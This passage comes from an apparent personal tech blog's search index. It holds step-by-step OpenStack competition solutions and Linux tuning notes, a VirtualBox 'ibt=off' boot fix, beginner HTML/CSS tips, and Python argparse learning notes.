20971519 10484736 83 Linux Partition table entries are not in disk order Command (m for help): w The partition table has been altered! Calling ioctl() to re-read partition table. Syncing disks. Format the partitions: [root@compute bin]# mkfs.ext4 /dev/sdb1 mke2fs 1.42.9 (28-Dec-2013) Filesystem label= OS type: Linux Block size=4096 (log=2) Fragment size=4096 (log=2) Stride=0 blocks, Stripe width=0 blocks 655360 inodes, 2621440 blocks 131072 blocks (5.00%) reserved for the super user First data block=0 Maximum filesystem blocks=2151677952 80 block groups 32768 blocks per group, 32768 fragments per group 8192 inodes per group Superblock backups stored on blocks: 32768, 98304, 163840, 229376, 294912, 819200, 884736, 1605632 Allocating group tables: done Writing inode tables: done Creating journal (32768 blocks): done Writing superblocks and filesystem accounting information: done [root@compute bin]# mkfs.ext4 /dev/sdb2 mke2fs 1.42.9 (28-Dec-2013) Filesystem label= OS type: Linux Block size=4096 (log=2) Fragment size=4096 (log=2) Stride=0 blocks, Stripe width=0 blocks 655360 inodes, 2621184 blocks 131059 blocks (5.00%) reserved for the super user First data block=0 Maximum filesystem blocks=2151677952 80 block groups 32768 blocks per group, 32768 fragments per group 8192 inodes per group Superblock backups stored on blocks: 32768, 98304, 163840, 229376, 294912, 819200, 884736, 1605632 Allocating group tables: done Writing inode tables: done Creating journal (32768 blocks): done Writing superblocks and filesystem accounting information: done Then run iaas-install-swift-controller.sh and iaas-install-swift-compute.sh scripts: [root@controller bin]# ./iaas-install-swift-controller.sh [root@compute bin]# ./iaas-install-swift-compute.sh Back to /root directory(Or other location of cirros-0.3.4-x86_64-disk.img): [root@controller bin]# cd ~ Create a container named examcontainer: [root@controller ~]# swift post examcontainer Upload the cirros-0.3.4-x86_64-disk.img image to the “examcontainer” container, and set segment storage with a size of 10M for each segment. [root@controller ~]# swift upload examcontainer -S 10000000 cirros-0.3.4-x86_64-disk.img cirros-0.3.4-x86_64-disk.img segment 1 cirros-0.3.4-x86_64-disk.img segment 0 cirros-0.3.4-x86_64-disk.img Then it’s finished. [Question 12] Creating a Cinder volume [0.5 points] Using the iaas-install-cinder-controller.sh and iaas-install-cinder-compute.sh scripts, install the Cinder service on both the control node and compute node. On the compute node, expand the block storage by creating an additional 5GB partition and adding it to the back-end storage for Cinder block storage. After completion, submit the username, password, and IP address of the compute node to the answer box. Install the Cinder Service in controller node: [root@controller bin]# ./iaas-install-cinder-controller.sh Install the Cinder Service in compute node: [root@compute bin]# ./iaas-install-cinder-compute.sh Check if succeed: [root@compute bin]# lsblk NAME MAJ:MIN RM SIZE RO TYPE MOUNTPOINT sda 8:0 0 50G 0 disk ├─sda1 8:1 0 1G 0 part /boot └─sda2 8:2 0 49G 0 part ├─centos-root 253:0 0 45.1G 0 lvm / └─centos-swap 253:1 0 3.9G 0 lvm [SWAP] sdb 8:16 0 20G 0 disk ├─sdb1 8:17 0 10G 0 part │ ├─cinder--volumes-cinder--volumes--pool_tmeta 253:2 0 12M 0 lvm │ │ └─cinder--volumes-cinder--volumes--pool 253:4 0 9.5G 0 lvm │ └─cinder--volumes-cinder--volumes--pool_tdata 253:3 0 9.5G 0 lvm │ └─cinder--volumes-cinder--volumes--pool 253:4 0 9.5G 0 lvm └─sdb2 8:18 0 10G 0 part /swift/node/sdb2 sdc 8:32 0 3G 0 disk sr0 11:0 1 1024M 0 rom [root@compute bin]# vgdisplay --- Volume group --- VG Name cinder-volumes System ID Format lvm2 Metadata Areas 1 Metadata Sequence No 4 VG Access read/write VG Status resizable MAX LV 0 Cur LV 1 Open LV 0 Max PV 0 Cur PV 1 Act PV 1 VG Size \u003c10.00 GiB PE Size 4.00 MiB Total PE 2559 Alloc PE / Size 2438 / 9.52 GiB Free PE / Size 121 / 484.00 MiB VG UUID QHk53K-Kj2O-ilc2-pxk6-Upqe-meRE-vfJu6P --- Volume group --- VG Name centos System ID Format lvm2 Metadata Areas 1 Metadata Sequence No 3 VG Access read/write VG Status resizable MAX LV 0 Cur LV 2 Open LV 2 Max PV 0 Cur PV 1 Act PV 1 VG Size \u003c49.00 GiB PE Size 4.00 MiB Total PE 12543 Alloc PE / Size 12542 / 48.99 GiB Free PE / Size 1 / 4.00 MiB VG UUID 2tEud0-Ydx6-cFfX-dZMM-F9IC-l3nc-sLS38v Well, it’s finished. [Question 13] Installation and Usage of Manila Service [0.5 point] Install the Manila service on the control and compute nodes using the iaas-install-manila-controller.sh and iaas-install-manila-compute.sh scripts, respectively. After installing the service, create a default_share_type share type (without driver support), and then create a shared storage called share01 with a size of 2G and grant permission for OpenStack management network segment to access the share01 directory. Finally, submit the username, password, and IP address of the control node to the answer box. Create a partion for Manila: [root@compute bin]# fdisk /dev/sdc Welcome to fdisk (util-linux 2.23.2). Changes will remain in memory only, until you decide to write them. Be careful before using the write command. Device does not contain a recognized partition table Building a new DOS disklabel with disk identifier 0x6e07efc2. Command (m for help): n Partition type: p primary (0 primary, 0 extended, 4 free) e extended Select (default p): p Partition number (1-4, default 1): First sector (2048-6291455, default 2048): Using default value 2048 Last sector, +sectors or +size{K,M,G} (2048-6291455, default 6291455): Using default value 6291455 Partition 1 of type Linux and of size 3 GiB is set Command (m for help): w The partition table has been altered! Calling ioctl() to re-read partition table. Syncing disks. Installl the Manila Service in controller node: [root@controller bin]# ./iaas-install-manila-controller.sh Install the Manila Service in compute node: [root@compute bin]# ./iaas-install-manila-compute.sh Create a default_share_type share type (without driver support): [root@controller bin]# manila type-create default_share_type False Check the manila type list: [root@controller bin]# manila type-list Create a shared storage called share01 with a size of 2G [root@controller bin]# manila create NFS 2 --name share01 Check if the operation succeed: [root@controller bin]# manila list +--------------------------------------+---------+------+-------------+-----------+-----------+--------------------+-----------------------------+-------------------+ | ID | Name | Size | Share Proto | Status | Is Public | Share Type Name | Host | Availability Zone | +--------------------------------------+---------+------+-------------+-----------+-----------+--------------------+-----------------------------+-------------------+ | 0cdd5acb-5e54-4cdd-9187-467e2800d212 | share01 | 2 | NFS | available | False | default_share_type | compute@lvm#lvm-single-pool | nova | +--------------------------------------+---------+------+-------------+-----------+-----------+--------------------+-----------------------------+-------------------+ Grant permission for OpenStack management network segment to access the share01 directory. [root@controller bin]# manila access-allow share01 ip 192.168.56.0/24 --access-level rw Check if the operation succeed! [root@controller bin]# manila access-list share01 +--------------------------------------+-------------+-----------------+--------------+--------+------------+----------------------------+------------+ | id | access_type | access_to | access_level | state | access_key | created_at | updated_at | +--------------------------------------+-------------+-----------------+--------------+--------+------------+----------------------------+------------+ | cad9f433-6ad3-4db9-afe1-90dc52374a08 | ip | 192.168.56.0/24 | rw | active | None | 2023-05-06T06:55:13.000000 | None | +--------------------------------------+-------------+-----------------+--------------+--------+------------+----------------------------+------------+ Done! [Question 14] Barbican Service Installation and Usage [0.5 points] Install the Barbican service using the iaas-install-barbican.sh script. After the installation is complete, use the openstack command to create a key named “secret01”. Once created, submit the username, password, and IP address of the control node in the answer box. Well, it’s easy, run iaas-install-barbican.sh in controller node. [root@controller bin]# ./iaas-install-barbican.sh Create a key named “secret01” [root@controller bin]# openstack secret store --name secret01 --payload secretkey Done! [Question 15] Cloudkitty Service Installation and Usage [0.5 points] Install the cloudkitty service using the iaas-install-cloudkitty.sh script. After installation, enable the hashmap rating module and then create the volume_thresholds group. Create a service matching rule for volume.size and set the price per GB to 0.01. Next, apply discounts to corresponding large amounts of data. Create a threshold in the volume_thresholds group and set a discount of 2% (0.98) if the threshold is exceeded for volumes over 50GB. After completing the setup, submit the username, password, and IP address of the control node in the answer box. Run the script to install the service: [root@controller bin]# ./iaas-install-cloudkitty.sh Enable hashmap: [root@controller bin]# openstack rating module enable hashmap Create hashmap service [root@controller bin]# openstack rating hashmap service create volume.size +-------------+--------------------------------------+ | Name | Service ID | +-------------+--------------------------------------+ | volume.size | 12b61017-6842-4d54-aa44-599d121e5f46 | +-------------+--------------------------------------+ Create hashmap service group [root@controller bin]# openstack rating hashmap group create volume_thresholds +-------------------+--------------------------------------+ | Name | Group ID | +-------------------+--------------------------------------+ | volume_thresholds | c46c8a1e-1878-4c44-bf36-57c06ce0672b | +-------------------+--------------------------------------+ Create volume price [root@controller bin]# openstack rating hashmap mapping create -s 12b61017-6842-4d54-aa44-599d121e5f46 -g c46c8a1e-1878-4c44-bf36-57c06ce0672b -t flat 0.01 +--------------------------------------+-------+------------+------+----------+--------------------------------------+--------------------------------------+------------+ | Mapping ID | Value | Cost | Type | Field ID | Service ID | Group ID | Project ID | +--------------------------------------+-------+------------+------+----------+--------------------------------------+--------------------------------------+------------+ | e5f99784-e49c-47ac-98e0-6f818c3ff6fb | None | 0.01000000 | flat | None | 12b61017-6842-4d54-aa44-599d121e5f46 | c46c8a1e-1878-4c44-bf36-57c06ce0672b | None | +--------------------------------------+-------+------------+------+----------+--------------------------------------+--------------------------------------+------------+ Create service rule [root@controller bin]# openstack rating hashmap threshold create -s 12b61017-6842-4d54-aa44-599d121e5f46 -g c46c8a1e-1878-4c44-bf36-57c06ce0672b -t rate 50 0.98 +--------------------------------------+-------------+------------+------+----------+--------------------------------------+--------------------------------------+------------+ | Threshold ID | Level | Cost | Type | Field ID | Service ID | Group ID | Project ID | +--------------------------------------+-------------+------------+------+----------+--------------------------------------+--------------------------------------+------------+ | a88e4768-defd-4c72-91f2-521b28e3c1a2 | 50.00000000 | 0.98000000 | rate | None | 12b61017-6842-4d54-aa44-599d121e5f46 | c46c8a1e-1878-4c44-bf36-57c06ce0672b | None | +--------------------------------------+-------------+------------+------+----------+--------------------------------------+--------------------------------------+------------+ Done! [Question 16] OpenStack Platform Memory Optimization [0.5 points] After setting up the OpenStack platform, disable memory sharing in the system and enable transparent huge pages. After completing this, submit the username, password, and IP address of the control node to the answer box. [root@controller ~]# find / -name defrag Disable memory sharing in the system and enable transparent huge pages. [root@controller ~]# echo never \u003e /sys/kernel/mm/transparent_hugepage/defrag Check the fianl result: [root@controller ~]# cat /sys/kernel/mm/transparent_hugepage/defrag always madvise [never] Done! Question 17] Modify file handle count [0.5 points] In a Linux server with high concurrency, it is often necessary to tune the Linux parameters in advance. By default, Linux only allows a maximum of 1024 file handles. When your server reaches its limit during high concurrency, you will encounter the error message “too many open files”. To address this, create a cloud instance and modify the relevant configuration to permanently increase the maximum file handle count to 65535 for the control node. After completing the configuration, submit the username, password, and IP address of the controller node to the answer box. Get the information of the maximum file handles: [root@controller ~]# ulimit -n 1024 Change the settings: [root@controller ~]# echo \"* soft nofile 65535\" \u003e\u003e /etc/security/limits.conf [root@controller ~]# echo \"* hard nofile 65535\" \u003e\u003e /etc/security/limits.conf Finally just reconnect to the ssh shell, and get the maximum file handles again. [root@controller ~]# ulimit -n 65535 [Question 18] Linux System Tuning - Dirty Data Writing Back [1.0 point] There may be dirty data in the memory of a Linux system, and the system generally defaults to writing back to the disk after 30 seconds of dirty data. Modify the system configuration file to temporarily adjust the time for writing back to the disk to 60 seconds. After completion, submit the username, password, and IP address of the controller node to the answer box. Just edit the file /etc/sysctl.conf: [root@controller ~]# vim /etc/sysctl.conf Add this property into it: vm.dirty_writeback_centisecs = 6000 Then execute: [root@controller ~]# sysctl -p Verify: [root@controller ~]# cat /proc/sys/vm/dirty_writeback_centisecs 6000 Done! [Question 19] Linux System Tuning - Preventing SYN Attacks [0.5 points] Modify the relevant configuration files on the controller node to enable SYN cookies and prevent SYN flood attacks. After completion, submit the username, password, and IP address of the controller node to the answer box. Edit the file /etc/sysctl.conf [root@controller ~]# vim /etc/sysctl.conf Add these properties into it: net.ipv4.tcp_max_syn_backlog=2048 net.ipv4.tcp_syncookies=1 net.ipv4.tcp_syn_retries = 0 Then execute: [root@controller ~]# sysctl -p Done! ","date":"2023-05-04","objectID":"/posts/attempted_solution_to_the_openstack_provincial_competition_problem_part1/:3:1","tags":["OpenStack","Linux","CentOS","Competition","Installation","Notes","Attempt","operations and maintenance","Keystone","Glance","Placement","Nova","Neutron","Swift","Cinder","Manila"],"title":"Attempted solution to the OpenStack Provincial Competition problem (Part One: Installation)","uri":"/posts/attempted_solution_to_the_openstack_provincial_competition_problem_part1/"},{"categories":["operations and maintenance"],"content":"Conclusion Well, finally, I finished all the steps of establishing the OpenStack! These are the notes of the process. ","date":"2023-05-04","objectID":"/posts/attempted_solution_to_the_openstack_provincial_competition_problem_part1/:4:0","tags":["OpenStack","Linux","CentOS","Competition","Installation","Notes","Attempt","operations and maintenance","Keystone","Glance","Placement","Nova","Neutron","Swift","Cinder","Manila"],"title":"Attempted solution to the OpenStack Provincial Competition problem (Part One: Installation)","uri":"/posts/attempted_solution_to_the_openstack_provincial_competition_problem_part1/"},{"categories":["Problem Solving"],"content":"Attempt to solve the problem of VirtualBox stuck on 'Starting' when starting a virtual machine. It is said that there has been a big news recently, and this problem can be solved by setting the kernel parameter ibt=off.","date":"2023-03-06","objectID":"/posts/problem_of_virtualbox_appeding_starting_vm/","tags":["VirtualBox","Linux","KVM","Kernel","Virtual Machine","Grub","ibt=off"],"title":"Attempt to Solve the Problem of VirtualBox Stuck on 'Starting' When Starting a Virtual Machine","uri":"/posts/problem_of_virtualbox_appeding_starting_vm/"},{"categories":["Problem Solving"],"content":"Prologue: What was the problem? Today, I felt like playing around with VirtualBox and discovered that every virtual machine was stuck at Starting virtual machine.. The first step when encountering a problem is to go to Google. Hmm… I found two posts on the official Arch forum. Virtualbox hangs on Starting virtual machine window / Newbie Corner / Arch Linux Forums KVM busted in linux 5.18 due to Intel CET / Kernel \u0026 Hardware / Arch Linux Forums After reading the two posts, I discovered that it was due to a bug in KVM in the new version of the kernel. Fortunately, a skilled individual had already submitted a bug report. FS#75481 : [linux] VBox virtual machines stop functioning x86/ibt: Add IBT feature, MSR and #CP handling · torvalds/linux@991625f · GitHub As for how this bug came about… I’m not sure, I’m not that knowledgeable. Thinking about how to solve it Based on the content of the posts I’ve read, the solution is to set the kernel parameter ibt=off. Thank you appending ibt=off to kernel boot params fixed my problem. ","date":"2023-03-06","objectID":"/posts/problem_of_virtualbox_appeding_starting_vm/:0:0","tags":["VirtualBox","Linux","KVM","Kernel","Virtual Machine","Grub","ibt=off"],"title":"Attempt to Solve the Problem of VirtualBox Stuck on 'Starting' When Starting a Virtual Machine","uri":"/posts/problem_of_virtualbox_appeding_starting_vm/"},{"categories":["Problem Solving"],"content":"How do I set kernel boot parameters? Since I didn’t know how to do this, I went to Google and found a method. How to set kernel boot parameters on Linux - Linux Tutorials - Learn Linux Configuration ","date":"2023-03-06","objectID":"/posts/problem_of_virtualbox_appeding_starting_vm/:1:0","tags":["VirtualBox","Linux","KVM","Kernel","Virtual Machine","Grub","ibt=off"],"title":"Attempt to Solve the Problem of VirtualBox Stuck on 'Starting' When Starting a Virtual Machine","uri":"/posts/problem_of_virtualbox_appeding_starting_vm/"},{"categories":["Problem Solving"],"content":"Proposed Solution Actually, the solution is to edit the value of GRUB_CMDLINE_LINUX=\"\" in the /etc/default/grub file and add “ibt=off” to it. Solution Steps ","date":"2023-03-06","objectID":"/posts/problem_of_virtualbox_appeding_starting_vm/:2:0","tags":["VirtualBox","Linux","KVM","Kernel","Virtual Machine","Grub","ibt=off"],"title":"Attempt to Solve the Problem of VirtualBox Stuck on 'Starting' When Starting a Virtual Machine","uri":"/posts/problem_of_virtualbox_appeding_starting_vm/"},{"categories":["Problem Solving"],"content":"1. Edit the /etc/default/grub file The purpose of editing this file is to set the kernel boot parameters. The method for setting this may vary depending on the system booted by different bootloaders. As I am using Grub in my Arch system, I need to edit this file. $ sudo vim /etc/default/grub Find the keyword GRUB_CMDLINE_LINUX=\"\" and add the parameter ibt=off. # GRUB boot loader configuration GRUB_DEFAULT=0 GRUB_TIMEOUT=5 GRUB_DISTRIBUTOR=\"Arch\" GRUB_CMDLINE_LINUX_DEFAULT=\"loglevel=7\" GRUB_CMDLINE_LINUX=\"ibt=off\" ...... Enter : and type wq to save and exit the file (this is a basic operation and requires no further explanation). ","date":"2023-03-06","objectID":"/posts/problem_of_virtualbox_appeding_starting_vm/:3:0","tags":["VirtualBox","Linux","KVM","Kernel","Virtual Machine","Grub","ibt=off"],"title":"Attempt to Solve the Problem of VirtualBox Stuck on 'Starting' When Starting a Virtual Machine","uri":"/posts/problem_of_virtualbox_appeding_starting_vm/"},{"categories":["Problem Solving"],"content":"2. Regenerate the Grub configuration file Then, regenerate the Grub configuration file. $ sudo grub-mkconfig -o /boot/grub/grub.cfg Wait for the operation to complete. If there are no errors, you can restart the operating system. $ sudo reboot Testing and Verification After restarting the system, open VirtualBox again and start a virtual machine. At this point, it should successfully enter the system. This means that the problem has been solved. ","date":"2023-03-06","objectID":"/posts/problem_of_virtualbox_appeding_starting_vm/:4:0","tags":["VirtualBox","Linux","KVM","Kernel","Virtual Machine","Grub","ibt=off"],"title":"Attempt to Solve the Problem of VirtualBox Stuck on 'Starting' When Starting a Virtual Machine","uri":"/posts/problem_of_virtualbox_appeding_starting_vm/"},{"categories":["Web"],"content":"Introduction Many beginners often encounter some basic problems when learning HTML and CSS, which can be frustrating. I originally didn’t want to write about basic topics, but I feel that some people may need to see this kind of content…so here are some tips. There is not much to say, just some issues related to syntax and usage. Common Issues I Have Noticed ","date":"2022-11-17","objectID":"/posts/something-about-html-css/:0:0","tags":["HTML","CSS","Front-end","Web Design","Basics","Rant"],"title":"Some Thoughts on Writing HTML and CSS","uri":"/posts/something-about-html-css/"},{"categories":["Web"],"content":"HTML Syntax Problems ","date":"2022-11-17","objectID":"/posts/something-about-html-css/:1:0","tags":["HTML","CSS","Front-end","Web Design","Basics","Rant"],"title":"Some Thoughts on Writing HTML and CSS","uri":"/posts/something-about-html-css/"},{"categories":["Web"],"content":"Tag Order Problems I often get asked questions like “Why isn’t my content showing up when I put the tags in?”, or “Why isn’t this working…” and so on. The first question I was asked was why the content of the title (\u003ch1\u003e tag) wasn’t showing up. I took a look at their code: \u003c!DOCTYPE html\u003e \u003chtml\u003e \u003chead\u003e \u003cmeta charset=\"utf-8\" /\u003e \u003ctitle\u003eTest\u003c/title\u003e \u003c/head\u003e \u003cbody\u003e \u003cp\u003e ppp \u003ch1\u003eTT\u003c/h1\u003e pppp \u003c/p\u003e \u003c/body\u003e \u003c/html\u003e I couldn’t believe it – they put the \u003ch1\u003e tag inside the \u003cp\u003e tag… It’s clear that they aren’t familiar with either of these tags. Both \u003ch1\u003e and \u003cp\u003e are block-level elements, and by default the font size of \u003ch1\u003e is larger than that of \u003cp\u003e. Therefore, putting them together may result in display errors. Normally, these two tags exist on the same level, and both will occupy a line to display. If the larger \u003ch1\u003e tag is nested inside the smaller one, of course you won’t be able to see it~ In summary, there cannot be headings within paragraphs, and they cannot be nested within each other. Therefore, the correct way to write it should be as follows: \u003c!DOCTYPE html\u003e \u003chtml\u003e \u003chead\u003e \u003cmeta charset=\"utf-8\" /\u003e \u003ctitle\u003eTest\u003c/title\u003e \u003c/head\u003e \u003cbody\u003e \u003ch1\u003eThe Title Of An article.\u003c/h1\u003e \u003cp\u003eThe Paragraph.\u003c/p\u003e \u003c/body\u003e \u003c/html\u003e ","date":"2022-11-17","objectID":"/posts/something-about-html-css/:1:1","tags":["HTML","CSS","Front-end","Web Design","Basics","Rant"],"title":"Some Thoughts on Writing HTML and CSS","uri":"/posts/something-about-html-css/"},{"categories":["Web"],"content":"Missing Symbols Sometimes I get asked about this issue as well, and I feel like these are all basic errors. Looking at the code, I’m like, “What is this mess?\" It’s clearly not standard HTML. \u003c!DOCTYPE html\u003e \u003chtml\u003e \u003chead\u003e \u003cmeta charset=\"utf-8\" \u003e \u003ctitle\u003eTest\u003c/title \u003c/head\u003e \u003cbody\u003e \u003cdiv\u003e \u003ch1\u003eTest\u003c/h1 \u003cp Text\u003c/p\u003e \u003cdiv\u003e /body\u003e \u003c/html\u003e This type of code… Either they weren’t paying attention when writing it or they’re not familiar with how to use these tags. Or perhaps they don’t know how to represent tags. Let me explain again: there are two types of tags, single tags and double tags. Taking the tag for inserting an image as an example, the single tag looks like this: \u003cimg /\u003e. The \u003c at the beginning and \u003e at the end can’t be left out, and it’s best to add a / before the closing \u003e. As for double tags, let’s take the paragraph tag as an example: \u003cp\u003eThis is a paragraph.\u003c/p\u003e. This type of double tag must have an opening and closing tag. Neither the beginning nor the end can be left out. When writing double tags and there’s nesting involved, it’s a good habit to indent each level on a new line. \u003c!DOCTYPE html\u003e \u003chtml\u003e \u003chead\u003e \u003cmeta charset=\"utf-8\" /\u003e \u003ctitle\u003eTest\u003c/title\u003e \u003c/head\u003e \u003cbody\u003e \u003cdiv class=\"Box1\"\u003e \u003cdiv class=\"Box2\"\u003e \u003ch1\u003eTitle\u003c/h1\u003e \u003cul\u003e \u003cli\u003e \u003cp\u003ePara1\u003c/p\u003e \u003c/li\u003e \u003cli\u003e \u003cp\u003ePara2\u003c/p\u003e \u003c/li\u003e \u003c/ul\u003e \u003c/div\u003e \u003c/div\u003e \u003c/body\u003e \u003c/html\u003e This way, the code is not only beautiful, but it’s also easier to maintain and troubleshoot in the future. ","date":"2022-11-17","objectID":"/posts/something-about-html-css/:1:2","tags":["HTML","CSS","Front-end","Web Design","Basics","Rant"],"title":"Some Thoughts on Writing HTML and CSS","uri":"/posts/something-about-html-css/"},{"categories":["Web"],"content":"Not Differentiating Between \u003chead\u003e and \u003cbody\u003e In addition to the aforementioned issues, there are even cases where people write \u003cdiv\u003e tags inside the \u003chead\u003e, which indicates that they haven’t yet distinguished between the HTML header and content display areas. I can only explain it this way: The \u003chead\u003e section is the header information area, which is what the server sends to the browser. The code inside it is not rendered on the page in the browser. The \u003cbody\u003e section is the content display area, used to write tags that can be displayed. You can also write \u003cscript\u003e tags with JavaScript code nested inside, but CSS styles cannot be written here. ","date":"2022-11-17","objectID":"/posts/something-about-html-css/:1:3","tags":["HTML","CSS","Front-end","Web Design","Basics","Rant"],"title":"Some Thoughts on Writing HTML and CSS","uri":"/posts/something-about-html-css/"},{"categories":["Web"],"content":"CSS Problems In addition to syntax issues and not differentiating between sections in HTML, there are also some strange questions people ask me when writing CSS. ","date":"2022-11-17","objectID":"/posts/something-about-html-css/:2:0","tags":["HTML","CSS","Front-end","Web Design","Basics","Rant"],"title":"Some Thoughts on Writing HTML and CSS","uri":"/posts/something-about-html-css/"},{"categories":["Web"],"content":"Referencing Stylesheets There are three ways to reference CSS stylesheets, according to textbooks, but the most commonly used are two. My personal favorite is to use \u003clink\u003e to link the stylesheet. This way, you can split it into two files and write them side by side, making it very convenient. You don’t need to flip back and forth like with inline styles. As for inline styles? They’re not used much, I almost never use them in practice. But there are still people who don’t know how to link stylesheets? The main issue is not understanding the concept of paths. It’s actually very simple – just remember the relative path and then fill it into the href attribute value of the \u003clink\u003e tag. \u003clink type=\"text/css\" rel=\"stylesheet\" href=\"css/style.css\" /\u003e Of course, there are still people who don’t know how to use inline styles, but there’s not much to say about it. Just remember that the \u003cstyle\u003e tag must be placed inside the \u003chead\u003e section and then write the styles using the correct CSS format inside the \u003cstyle\u003e tag. For example： \u003c!DOCTYPE html\u003e \u003chtml lang=\"en\"\u003e \u003chead\u003e \u003cmeta charset=\"UTF-8\"\u003e \u003cmeta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\"\u003e \u003cmeta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"\u003e \u003ctitle\u003eDocument\u003c/title\u003e \u003c/head\u003e \u003cstyle type=\"text/css\"\u003e *{ margin: 0; padding: 0; } .TopHead{ background-color: white; border: solid 1px black; width: 100px; height: 200px; } \u003c/style\u003e \u003cbody\u003e \u003cdiv class=\"TopHead\"\u003e \u003c/div\u003e \u003c/body\u003e \u003c/html\u003e ","date":"2022-11-17","objectID":"/posts/something-about-html-css/:2:1","tags":["HTML","CSS","Front-end","Web Design","Basics","Rant"],"title":"Some Thoughts on Writing HTML and CSS","uri":"/posts/something-about-html-css/"},{"categories":["Web"],"content":"When writing CSS, losing ;, {, and } and misspelling words. These are all minor mistakes that can be improved with more practice and attention. The correct template should look like this: Selector { Property: value; } .TopHead{ background-color: white; border: solid 1px black; width: 100px; height: 200px; } ","date":"2022-11-17","objectID":"/posts/something-about-html-css/:2:2","tags":["HTML","CSS","Front-end","Web Design","Basics","Rant"],"title":"Some Thoughts on Writing HTML and CSS","uri":"/posts/something-about-html-css/"},{"categories":["Web"],"content":"Remove default padding and margin Many beginners do not develop the habit of resetting default padding and margin in CSS when they start coding, which leads to difficulty in styling as they progress. In fact, it’s quite simple: *{ margin: 0; padding: 0; } * is a regular wildcard character in CSS, and it has the lowest priority among all selectors. Setting its margin and padding properties to 0 before everything else can eliminate the default padding and margin for all elements before they are selected by a specific selector. This makes it much easier to make more accurate adjustments to element spacing later on. If you’re still not sure whether or not to include it, try it out and see the difference for yourself. ","date":"2022-11-17","objectID":"/posts/something-about-html-css/:2:3","tags":["HTML","CSS","Front-end","Web Design","Basics","Rant"],"title":"Some Thoughts on Writing HTML and CSS","uri":"/posts/something-about-html-css/"},{"categories":["Web"],"content":"Inappropriate naming when using class selectors and ID selectors This is also a big problem that greatly affects the readability and maintainability of the code. I often see something like this: .a1{ } .a2{ } #b1{ } #b2{ } It’s hard to know what element it actually selects, which increases workload… Because at first glance, it’s unclear what it refers to. Also, using Chinese characters for naming, although I used to like to do this when I was in middle school, this habit is not good because if there are some server encoding issues, the style files may not be loaded properly. h1.中央标题 { text-align:center; font-size:22px; } h1.一级标题 { font-size:22px; } h2.二级标题 { font-size:20px; } h2.三级标题 { font-size:18px; } h2.四级标题 { font-size:16px; } p.普通文字 { text-indent:25px; font-size:15px; text-align:justify; } But some people even use numbers! And then they ask me why the style is not displaying properly! .1{ color: red; } Numbers or names that start with numbers cannot be used as class selector names and IDs in CSS. Similarly, in many programming languages, it is not allowed to name variables using numbers or names that begin with numbers. To avoid this problem, naming conventions such as camelCase and _ concatenation can be used. Upper camel case refers to two words combined, with the first letter of each word capitalized, such as TopHead. Lower camel case refers to two words combined, with only the first letter of the second word capitalized, such as contentPlace. For naming conventions with more than two words, the _ character is needed to combine them, such as the_menu_bar. .TopHead{ width: 1000px; height: 300px; } .contentPlace{ width: 1000px; height: auto; } .the_menu_bar{ width: 100%; height: 50px; background-color: blue; } This significantly improves readability so that one can generally tell at a glance which element corresponds to which, without having to spend time searching through the code. End The above are just my personal opinions and methods for addressing some of the small issues that beginner learners may encounter when studying HTML and CSS. There may be other problems that I haven’t discovered yet… Feel free to leave a comment below to share your thoughts and feedback. ","date":"2022-11-17","objectID":"/posts/something-about-html-css/:2:4","tags":["HTML","CSS","Front-end","Web Design","Basics","Rant"],"title":"Some Thoughts on Writing HTML and CSS","uri":"/posts/something-about-html-css/"},{"categories":["Programming"],"content":"Using ArgParse in Python learning notes allows Python programs to add options on the command line...","date":"2021-05-16","objectID":"/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-argparse/","tags":["Notes","Linux","Python","Programming"],"title":"Python Learning Notes - ArgParse","uri":"/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-argparse/"},{"categories":["Programming"],"content":"Introduction In order to make TitleGetter more flexible, I plan to let users customize list.txt and the output file. Therefore, this requires the use of command line options… just like some software we commonly use, such as pacman. So I googled it and learned about ArgParse. The argparse module makes it easy to write user-friendly command-line interfaces. The program defines what arguments it requires, and argparse will figure out how to parse those out of sys.argv. The argparse module also automatically generates help and usage messages and issues errors when users give the program invalid arguments. From: argparse â Parser for command-line options, arguments and sub-commands — Python 3.9.5 documentation Then I tried typing a file… The result of running it looks like this: So let’s organize some related notes… Creating Parser \u0026\u0026 Adding Options Before everything starts, we need to use the ArgumentParser usage in the argparse library to create a variable named parser. import argparse parser = argparse.ArgumentParser(description='') There is a parameter description='' here, which is used for writing some explanations… For example, we wrote: import argparse parser = argparse.ArgumentParser(description='Welcome') By the way, we need to write down some necessary options~ parser.add_argument() can be used here. We need to add some things inside, such as the usage format of options like -a and --about. Finally, add args = parser.parse_args(). import argparse parser = argparse.ArgumentParser(description='Welcome') parser.add_argument('-a','--about', help='Show the about') args = parser.parse_args() At this point, we can add -h to see the effect. $ python a.py -h usage: a.py [-h] [-a ABOUT] Welcome optional arguments: -h, --help show this help message and exit -a ABOUT, --about ABOUT Show the about Then let’s organize a few commonly used parameters. default * The default value when no parameters are set. parser.add_argument('-a','--about', help='Show the about', defualt='text.txt') If the user does not set this parameter, a default one will be provided automatically. help Add explanatory text to the corresponding option. required Used to determine whether this parameter must be set. If required=True is set, an error will be reported if this parameter is not set at runtime. parser.add_argument('-a','--about', required=True) $ python a.py usage: a.py [-h] -a ABOUT a.py: error: the following arguments are required: -a/--about Calling the Obtained Option Parameters Next, we need to use the obtained parameters. We know that when something is written after an option on the command line, the program will get it as a string by default. Then we have to use this to do what we want. I wrote a simple script that can write the contents of one file to another file. import argparse print(''' By WeepingDogel ''') def GetParser(): parser = argparse.ArgumentParser(description='Help', epilog='A new testing program.') parser.add_argument('-o','--output', help='Output file',default='test.txt' , required=True) parser.add_argument('-r','--read',help='read a file', required=True) return parser def Write(content, filename): f = open(filename,\"a\") f.write(content) f.close() print(filename + ' has been written') def Read(filename): f = open(filename) text = f.read() return text def Main(): parser = GetParser() args = parser.parse_args() Write(Read(args.read),args.output) Main() It is easy to see that what we obtain will go into the variable args, because it is assigned from the content returned by the function parser.parse_args(). To get the corresponding value of an option parameter, you can access it using args.option_name. For example, if we want to get the written file name: $ vim b.py import argparse parser = argparse.ArgumentParser(description='Help', epilog='A new testing program.') parser.add_argument('-o','--output', help='Output file',default='test.txt' , required=True) args = parser.parse_args() filename = args.output print(\"The filename is \"+ filename) $ python b.py -o WeepingDogel The filename is WeepingDogel As you can see, we have obtained the string “WeepingDogel”. Similarly, the file name to be read is the same: args.read That’s all you need to do ～ Next, let’s take a screenshot of the effect of the above code: Creating and using it is that simple… Of course, there are more usages to explore… Conclusion So what I’m going to do next is to update these 